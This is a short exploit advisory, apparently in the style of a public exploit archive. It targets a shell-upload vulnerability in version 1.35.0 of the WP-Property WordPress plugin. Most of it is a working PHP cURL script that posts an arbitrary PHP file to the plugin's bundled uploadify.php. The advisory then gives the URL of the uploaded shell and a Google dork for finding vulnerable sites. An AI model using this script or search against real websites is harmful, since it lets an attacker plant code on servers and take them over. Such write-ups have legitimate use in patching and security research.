@@ -1,0 +1,39 @@
+##################################################
+# Description : Wordpress Plugins - WP-Property - WordPress Powered Real 
+Estate and Property Management Shell Upload Vulnerability
+# Version : 1.35.0
+# Link : http://wordpress.org/extend/plugins/wp-property/
+# Plugins : http://downloads.wordpress.org/plugin/wp-property.zip
+# Date : 26-05-2012
+# Google Dork : inurl:/wp-content/plugins/wp-property/
+# Author : Sammy FORGIT - sam at opensyscom dot fr - 
+http://www.opensyscom.fr
+##################################################
+
+Exploit :
+
+PostShell.php
+<?php
+
+$uploadfile="lo.php";
+$ch = 
+curl_init("http://www.exemple.com/wordpress/wp-content/plugins/wp-property/third-party/uploadify/uploadify.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+         array('Filedata'=>"@$uploadfile",
+         
+'folder'=>"/wordpress/wp-content/plugins/wp-property/third-party/uploadify/"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+
+?>
+
+Shell Access :
+http://www.exemple.com/wordpress/wp-content/plugins/wp-property/third-party/uploadify/lo.php
+
+lo.php
+<?php
+phpinfo();
+?>
